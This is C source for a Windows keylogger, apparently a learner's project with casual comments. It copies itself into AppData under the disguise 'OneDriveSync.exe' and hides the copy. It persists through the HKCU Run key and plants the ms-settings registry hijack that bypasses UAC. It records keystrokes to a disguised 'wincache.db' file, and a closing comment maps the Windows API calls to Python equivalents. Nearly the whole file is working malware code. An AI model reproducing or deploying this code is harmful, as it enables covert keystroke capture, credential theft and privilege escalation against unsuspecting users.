#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "shell32.lib")

void move_to_appdata(char *dst){
    char app[MAX_PATH], self[MAX_PATH]; //'app' holds the destination path. 'self' holds the current
    SHGetFolderPathA(0, CSIDL_APPDATA, 0, 0, app); //finds %APPDATA path
    lstrcatA(app, "\\Microsoft\\Windows\\OneDriveSync.exe");
    GetModuleFileNameA(0, self, MAX_PATH);
    if (lstrcmpiA(app, self) != 0) { // check if its already there 
        CopyFileA(self, app, FALSE);
        SetFileAttributesA(app, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    lstrcpyA(dst, app); //copies final path to dst
} // why did windows api choose such complicated names im gonna cry i cant remember all this 
void log_p(char *outPath) {
    char appData[MAX_PATH];
    SHGetFolderPathA(0, CSIDL_APPDATA, 0, 0, appData);
    lstrcatA(appData, "\\Microsoft\\CLR_v4.0");
    CreateDirectoryA(appData, 0);
    lstrcatA(appData, "\\wincache.db");
    lstrcpyA(outPath, appData);
}
void persist(const char *path) {
    HKEY k;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &k);
    RegSetValueExA(k, "WinSnv", 0, REG_SZ, (BYTE*)path, lstrlenA(path) + 1);
    RegCloseKey(k);
}
void UAC_bypass(const char *path) {
    HKEY k;
    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", 0, 0, 0, KEY_WRITE, 0, &k, 0);
    RegSetValueExA(k, 0, 0, REG_SZ, (BYTE*)path, lstrlenA(path) + 1);
    RegSetValueExA(k, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
    RegCloseKey(k);

}
int main() {
    char exePath[MAX_PATH];
    char logPath[MAX_PATH];
    move_to_appdata(exePath);
    persist(exePath);
    UAC_bypass(exePath);

    log_p(logPath);

    HANDLE f = CreateFileA(
        logPath,
        FILE_APPEND_DATA,
        FILE_SHARE_WRITE,
        0,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,   // to open file
        0
    );
    char c;
    DWORD w;

    while(1) {
        for (short k = 8; k < 256; k++) {
            SHORT s = GetAsyncKeyState(k);
            if (s & 1 && k >= 32 && k <= 126) {
                c = (char)k;
                WriteFile(f, &c, 1, &w, 0);
            }
        }
        Sleep((30 + (rand() % 30)) * 1000);
    }
}

/* SHGetFolderPathA = os.getenv("APPDATA")
GetModuleFileNameA = sys.executable
lstrcatA / lstrcpyA = + operator / assignment
CopyFileA = shutil.copy2
SetFileAttributesA = ctypes.windll.kernel32.SetFileAttributesW
CreateDirectoryA = os.makedirs
CreateFileA = open()
WriteFile = file.write()
Sleep = time.sleep()
rand() = random.randint()
RegOpenKeyExA = winreg.OpenKey
RegSetValueExA = winreg.SetValueEx
RegCloseKey = winreg.CloseKey
*/